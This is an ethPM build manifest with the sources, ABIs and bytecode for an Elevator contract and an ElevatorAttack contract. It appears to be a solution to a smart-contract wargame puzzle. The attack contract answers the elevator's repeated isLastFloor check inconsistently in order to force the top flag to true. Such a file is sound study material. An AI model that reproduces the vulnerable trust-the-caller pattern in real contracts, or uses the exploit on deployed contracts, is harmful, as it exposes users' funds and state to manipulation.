{"compilers":[{"contractTypes":["ElevatorAttack"],"name":"solidity","settings":{"optimizer":{"enabled":true,"runs":200},"outputSelection":{"contracts/Elevator.sol":{"":["ast"],"*":["abi","bin-runtime","devdoc","userdoc","evm.bytecode.object","evm.bytecode.sourceMap","evm.deployedBytecode.object"]},"contracts/ElevatorAttack.sol":{"":["ast"],"*":["abi","bin-runtime","devdoc","userdoc","evm.bytecode.object","evm.bytecode.sourceMap","evm.deployedBytecode.object"]}}},"version":"0.8.26+commit.8a97fa7a"}],"contractTypes":{"Building":{"abi":[{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"isLastFloor","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}],"contractName":"Building","deploymentBytecode":{"bytecode":"0x"},"devdoc":{"kind":"dev","methods":{},"version":1},"methodIdentifiers":{"isLastFloor(uint256)":"0x5f9a4bca"},"runtimeBytecode":{"bytecode":"0x"},"sourceId":"contracts/Elevator.sol","sourcemap":"","userdoc":{"kind":"user","methods":{},"version":1}},"Elevator":{"abi":[{"inputs":[],"name":"floor","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"_floor","type":"uint256"}],"name":"goTo","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"top","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}],"contractName":"Elevator","deploymentBytecode":{"bytecode":"0x6080604052348015600e575f80fd5b506101ea8061001c5f395ff3fe608060405234801561000f575f80fd5b506004361061003f575f3560e01c80634069536314610043578063ed9a71341461005f578063fe6dcdba14610074575b5f80fd5b61004c60015481565b6040519081526020015b60405180910390f35b61007261006d366004610177565b610090565b005b5f546100809060ff1681565b6040519015158152602001610056565b604051632fcd25e560e11b81526004810182905233908190635f9a4bca906024016020604051808303815f875af11580156100cd573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100f1919061018e565b610173576001829055604051632fcd25e560e11b8152600481018390526001600160a01b03821690635f9a4bca906024016020604051808303815f875af115801561013e573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610162919061018e565b5f805460ff19169115159190911790555b5050565b5f60208284031215610187575f80fd5b5035919050565b5f6020828403121561019e575f80fd5b815180151581146101ad575f80fd5b939250505056fea2646970667358221220b8507a7128bec4c23d970af90b20d7ad39b9d6fb7489aa4fd60ddbb0a22dc23b64736f6c634300081a0033"},"devdoc":{"kind":"dev","methods":{},"version":1},"methodIdentifiers":{"floor()":"0x40695363","goTo(uint256)":"0xed9a7134","top()":"0xfe6dcdba"},"runtimeBytecode":{"bytecode":"0x608060405234801561000f575f80fd5b506004361061003f575f3560e01c80634069536314610043578063ed9a71341461005f578063fe6dcdba14610074575b5f80fd5b61004c60015481565b6040519081526020015b60405180910390f35b61007261006d366004610177565b610090565b005b5f546100809060ff1681565b6040519015158152602001610056565b604051632fcd25e560e11b81526004810182905233908190635f9a4bca906024016020604051808303815f875af11580156100cd573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100f1919061018e565b610173576001829055604051632fcd25e560e11b8152600481018390526001600160a01b03821690635f9a4bca906024016020604051808303815f875af115801561013e573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610162919061018e565b5f805460ff19169115159190911790555b5050565b5f60208284031215610187575f80fd5b5035919050565b5f6020828403121561019e575f80fd5b815180151581146101ad575f80fd5b939250505056fea2646970667358221220b8507a7128bec4c23d970af90b20d7ad39b9d6fb7489aa4fd60ddbb0a22dc23b64736f6c634300081a0033"},"sourceId":"contracts/Elevator.sol","sourcemap":"186:299:0:-:0;;;;;;;;;;;;;;;;;;;","userdoc":{"kind":"user","methods":{},"version":1}},"ElevatorAttack":{"abi":[{"inputs":[{"internalType":"address","name":"_addr","type":"address"}],"stateMutability":"payable","type":"constructor"},{"inputs":[],"name":"_switch","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"elevator","outputs":[{"internalType":"contract Elevator","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"isLastFloor","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"floor","type":"uint256"}],"name":"setTop","outputs":[],"stateMutability":"nonpayable","type":"function"}],"contractName":"ElevatorAttack","deploymentBytecode":{"bytecode":"0x608060408190525f805460ff60a01b1916600160a01b179055610222388190039081908339810160408190526032916055565b5f80546001600160a01b0319166001600160a01b03929092169190911790556080565b5f602082840312156064575f80fd5b81516001600160a01b03811681146079575f80fd5b9392505050565b6101958061008d5f395ff3fe608060405234801561000f575f80fd5b506004361061004a575f3560e01c80633f2525061461004e5780635f9a4bca14610063578063a14a9d3c146100b0578063b0cb4ff0146100c3575b5f80fd5b61006161005c366004610148565b6100ed565b005b61009b610071366004610148565b505f805460ff600160a01b808304821615810260ff60a01b19909316929092179283905591041690565b60405190151581526020015b60405180910390f35b5f5461009b90600160a01b900460ff1681565b5f546100d5906001600160a01b031681565b6040516001600160a01b0390911681526020016100a7565b5f54604051633b669c4d60e21b8152600481018390526001600160a01b039091169063ed9a7134906024015f604051808303815f87803b15801561012f575f80fd5b505af1158015610141573d5f803e3d5ffd5b5050505050565b5f60208284031215610158575f80fd5b503591905056fea2646970667358221220439a4942614c25e649597a382795570626f8f816424550cffa63409fd2c32b8964736f6c634300081a0033"},"devdoc":{"kind":"dev","methods":{},"version":1},"methodIdentifiers":{"_switch()":"0xa14a9d3c","elevator()":"0xb0cb4ff0","isLastFloor(uint256)":"0x5f9a4bca","setTop(uint256)":"0x3f252506"},"runtimeBytecode":{"bytecode":"0x608060405234801561000f575f80fd5b506004361061004a575f3560e01c80633f2525061461004e5780635f9a4bca14610063578063a14a9d3c146100b0578063b0cb4ff0146100c3575b5f80fd5b61006161005c366004610148565b6100ed565b005b61009b610071366004610148565b505f805460ff600160a01b808304821615810260ff60a01b19909316929092179283905591041690565b60405190151581526020015b60405180910390f35b5f5461009b90600160a01b900460ff1681565b5f546100d5906001600160a01b031681565b6040516001600160a01b0390911681526020016100a7565b5f54604051633b669c4d60e21b8152600481018390526001600160a01b039091169063ed9a7134906024015f604051808303815f87803b15801561012f575f80fd5b505af1158015610141573d5f803e3d5ffd5b5050505050565b5f60208284031215610158575f80fd5b503591905056fea2646970667358221220439a4942614c25e649597a382795570626f8f816424550cffa63409fd2c32b8964736f6c634300081a0033"},"sourceId":"contracts/ElevatorAttack.sol","sourcemap":"84:381:1:-:0;;;;;144:26;;;-1:-1:-1;;;;144:26:1;-1:-1:-1;;;144:26:1;;;177:84;;;;;;;;84:381;177:84;;;;;;;;;;:::i;:::-;228:8;:26;;-1:-1:-1;;;;;;228:26:1;-1:-1:-1;;;;;228:26:1;;;;;;;;;;84:381;;14:290:2;84:6;137:2;125:9;116:7;112:23;108:32;105:52;;;153:1;150;143:12;105:52;179:16;;-1:-1:-1;;;;;224:31:2;;214:42;;204:70;;270:1;267;260:12;204:70;293:5;14:290;-1:-1:-1;;;14:290:2:o;:::-;84:381:1;;;;;;","userdoc":{"kind":"user","methods":{},"version":1}}},"manifest":"ethpm/3","sources":{"contracts/Elevator.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n// 0x73d00519B15B74D88369cA5111eaF5c4Ad1c73F9\ninterface Building {\n    function isLastFloor(uint256) external returns (bool);\n}\n\ncontract Elevator {\n    bool public top;\n    uint256 public floor;\n\n    function goTo(uint256 _floor) public {\n        Building building = Building(msg.sender);\n\n        if (!building.isLastFloor(_floor)) {\n            floor = _floor;\n            top = building.isLastFloor(floor);\n        }\n    }\n}\n","urls":[]},"contracts/ElevatorAttack.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport \"./Elevator.sol\";\n\ncontract ElevatorAttack {\n    Elevator public elevator;\n    bool public _switch = true;\n\n    constructor(address _addr) public payable{\n        elevator = Elevator(_addr);\n    }\n\n    function isLastFloor(uint256) external returns (bool) {\n        _switch = !_switch;\n        return _switch;\n    }\n\n    function setTop(uint256 floor) external {\n        elevator.goTo(floor);\n    }\n}\n","urls":[]}}}